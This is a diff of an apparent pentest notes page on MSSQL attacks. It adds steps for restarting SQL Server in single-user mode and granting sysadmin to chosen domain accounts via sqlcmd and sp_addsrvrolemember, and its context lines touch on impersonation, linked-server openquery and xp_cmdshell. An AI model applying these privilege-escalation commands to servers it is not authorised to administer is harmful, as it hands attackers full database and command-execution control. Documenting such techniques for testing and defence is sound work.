@@ -1,6 +1,49 @@
 # MSSQL attacks
 
-## MSSQL attacks
+### SA single mode technique
+
+{% hint style="info" %}
+This technique can be used to add any user as SYSADMIN \(sa\).
+
+It requires Local Administrator privilege on the box.
+{% endhint %}
+
+1. Stop the services \(both server and agent\)
+
+![](../../../../.gitbook/assets/image%20%28205%29.png)
+
+    2. Using an elevated command prompt, start the server into Single Mode \( `-m`\)
+
+```csharp
+"C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\Binn\sqlservr.exe" -m  -sSQLEXPRESS
+```
+
+![](../../../../.gitbook/assets/image%20%28223%29.png)
+
+  3. Download SQLCMD utility from Microsoft website:
+
+{% embed url="https://go.microsoft.com/fwlink/?linkid=2142258" %}
+
+  4. From an another cmd prompt, use SQLCMD to connect to the server:
+
+```csharp
+sqlcmd -S SQLUAT
+```
+
+  5. Grant sa access to anyone
+
+```csharp
+sp_addsrvrolemember 'crook\homer_potter', 'sysadmin'
+GO
+sp_addsrvrolemember 'crook\sqladmin', 'sysadmin'
+GO
+```
+
+![](../../../../.gitbook/assets/image%20%28251%29.png)
+
+  6. Restart the SQL server as usual and enjoy.
+
+![](../../../../.gitbook/assets/image%20%28213%29.png)
 
 ### Impersonation 
 
@@ -38,7 +81,7 @@ select * from openquery("sql1",'select * from openquery("server2",''select * fro
 
 ### XP\_cmdshell Stored Procedures
 
-#### Give me shell
+#### shell
 
 ```csharp
 EXECUTE AS LOGIN = 'sa'
